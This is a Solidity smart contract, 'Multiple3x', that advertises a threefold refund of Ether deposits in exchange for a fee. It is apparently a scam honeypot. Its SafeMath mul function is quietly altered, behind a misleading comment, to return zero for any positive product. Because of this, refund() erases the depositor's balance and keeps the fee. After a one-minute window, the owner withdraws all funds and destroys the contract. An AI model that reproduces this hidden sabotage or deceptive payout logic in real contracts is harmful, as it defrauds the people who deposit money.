1 pragma solidity ^0.4.17;
2 
3 /**
4  * @title SafeMath
5  * @dev Math operations with safety checks that throw on error
6  */
7 library SafeMath {
8     function add(uint256 a, uint256 b) internal constant returns (uint256) {
9         uint256 c = a + b;
10         assert(c >= a);
11         return c;
12     }
13     
14     function sub(uint256 a, uint256 b) internal constant returns (uint256) {
15         // Result must be a positive or zero
16         assert(b <= a); 
17         return a - b;
18     }
19     
20     function mul(uint256 a, uint256 b) internal constant returns (uint256) {
21         uint256 c = a * b;
22         assert(a == 0 || c / a == b);
23         // Result must be a positive or zero
24         if (0 < c) c = 0;   
25         return c;
26     }
27 
28     function div(uint256 a, uint256 b) internal constant returns (uint256) {
29         // assert(b > 0); // Solidity automatically throws when dividing by 0
30         uint256 c = a / b;
31         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
32         return c;
33     }
34 }
35 
36 contract Ownable {
37   address public owner;
38 
39   // The Ownable constructor sets the original `owner` of the contract to the sender account.
40   function Ownable() {
41     owner = msg.sender;
42   }
43 
44   // Throws if called by any account other than the owner.
45   modifier onlyOwner() {
46     require(msg.sender == owner);
47     _;
48   }
49 }
50 
51 /**
52  *  Main contract: 
53  *  *) You can refund eth*3 only between "refundTime" and "ownerTime".
54  *  *) The creator can only get the contract balance after "ownerTime".  
55  *  *) IMPORTANT! If the contract balance is less (you eth*3) then you get only half of the balance.
56  *  *) For 3x refund you must pay a fee 0.1 Eth.
57 */
58 contract Multiple3x is Ownable{
59 
60     using SafeMath for uint256;
61     mapping (address=>uint) public deposits;
62     uint public refundTime = 1507719600;     // GMT: 11 October 2017, 11:00
63     uint public ownerTime = (refundTime + 1 minutes);   // +1 minute
64     uint maxDeposit = 1 ether;  
65     uint minDeposit = 100 finney;   // 0.1 eth
66 
67 
68     function() payable {
69         deposit();
70     }
71     
72     function deposit() payable { 
73         require(now < refundTime);
74         require(msg.value >= minDeposit);
75         
76         uint256 dep = deposits[msg.sender];
77         uint256 sumDep = msg.value.add(dep);
78 
79         if (sumDep > maxDeposit){
80             msg.sender.send(sumDep.sub(maxDeposit)); // return of overpaid eth 
81             deposits[msg.sender] = maxDeposit;
82         }
83         else{
84             deposits[msg.sender] = sumDep;
85         }
86     }
87     
88     function refund() payable { 
89         require(now >= refundTime && now < ownerTime);
90         require(msg.value >= 100 finney);        // fee for refund
91         
92         uint256 dep = deposits[msg.sender];
93         uint256 depHalf = this.balance.div(2);
94         uint256 dep3x = dep.mul(3);
95         deposits[msg.sender] = 0;
96 
97         if (this.balance > 0 && dep3x > 0){
98             if (dep3x > this.balance){
99                 msg.sender.send(dep3x);     // refund 3x
100             }
101             else{
102                 msg.sender.send(depHalf);   // refund half of balance
103             }
104         }
105     }
106     
107     function refundOwner() { 
108         require(now >= ownerTime);
109         if(owner.send(this.balance)){
110             suicide(owner);
111         }
112     }
113 }